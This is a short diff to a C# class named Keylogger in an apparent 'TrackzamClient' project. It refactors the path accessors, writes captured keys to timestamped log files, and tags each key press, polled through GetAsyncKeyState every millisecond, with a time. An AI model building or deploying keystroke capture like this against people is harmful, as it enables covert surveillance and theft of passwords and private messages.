@@ -5,6 +5,7 @@ using System.Runtime.InteropServices;
 using System.Windows.Input;
 using System.Windows.Threading;
 
+
 namespace TrackzamClient
 {
     class Keylogger
@@ -16,7 +17,8 @@ namespace TrackzamClient
         private StreamWriter writer;
         private DispatcherTimer timer;
 
-        public bool setPath(string path)
+        // returns true if the path is set successfuly without errors
+        public bool SetPath(string path)
         {
             if (Directory.Exists(path))
             {
@@ -42,14 +44,18 @@ namespace TrackzamClient
             }
 
         }
-        public string getPath()
+
+        // for clients read-only
+        public string Path
         {
-            return logDir + @"\log.txt";
+            get => logDir;
         }
 
         public void Start()
         {
-            writer = new StreamWriter(getPath());
+            string fileName = "\\" + TrackzamTimer.GetNowString();
+            writer = new StreamWriter(logDir + fileName);
+            
             timer = new DispatcherTimer();
             timer.Tick += TrackKeys;
             timer.Interval = new TimeSpan(0, 0, 0, 0, 1);
@@ -62,7 +68,7 @@ namespace TrackzamClient
             {
                 int key = GetAsyncKeyState(i);
                 if (key != 0)
-                    writer.WriteLine(verifyKey(i));
+                    writer.WriteLine("< {0} {1} >", verifyKey(i), TrackzamTimer.GetNowString());
             }
         }
 
